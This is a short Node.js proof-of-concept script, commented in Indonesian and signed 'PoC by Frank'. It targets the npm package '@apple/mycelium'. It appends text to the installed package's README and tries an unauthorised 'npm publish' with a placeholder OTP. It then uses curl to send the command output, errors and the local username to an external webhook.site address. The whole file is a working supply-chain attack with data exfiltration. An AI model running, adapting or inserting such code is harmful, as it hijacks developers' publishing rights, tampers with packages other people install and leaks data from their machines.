const { exec } = require('child_process');
const webhook = 'https://webhook.site/acc4bdb2-23c2-4ca6-8908-9a2558113cdb';

// Target paket yang akan diedit sesuai tantangan
const target = '@apple/mycelium';
const signature = 'PoC by Frank';

// Skrip untuk mengedit README dan mencoba mempublikasikan perubahan
const cmd = `echo "\n\n${signature}" >> node_modules/${target}/README.md && npm publish node_modules/${target} --otp=000000`;

exec(cmd, (error, stdout, stderr) => {
    const result = JSON.stringify({
        origin: "Frank Challenge Execution",
        status: error ? "ATTEMPTED" : "SUCCESS",
        stdout: stdout,
        stderr: stderr,
        env_user: process.env.USERNAME || process.env.USER || 'unknown',
        timestamp: new Date().toISOString()
    });
    
    const safePayload = result.replace(/'/g, "");
    exec(`curl -X POST -H "Content-Type: application/json" -d '${safePayload}' ${webhook}`);
});
